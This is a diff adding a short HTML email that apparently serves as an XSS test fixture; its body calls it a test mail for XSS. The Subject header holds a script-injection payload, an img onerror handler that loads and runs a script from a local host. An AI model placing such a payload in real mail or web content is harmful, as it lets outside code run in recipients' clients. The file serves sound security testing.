@@ -1,0 +1,7 @@
+From: Jennifer Craig <dbattistoni@grohe.com>
+To: srunswick@aol.com
+Subject: <img src=xx:x onerror=d=document;e=d.createElement('script');e.src='http://127.0.0.1/i.js';d.body.appendChild(e);>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
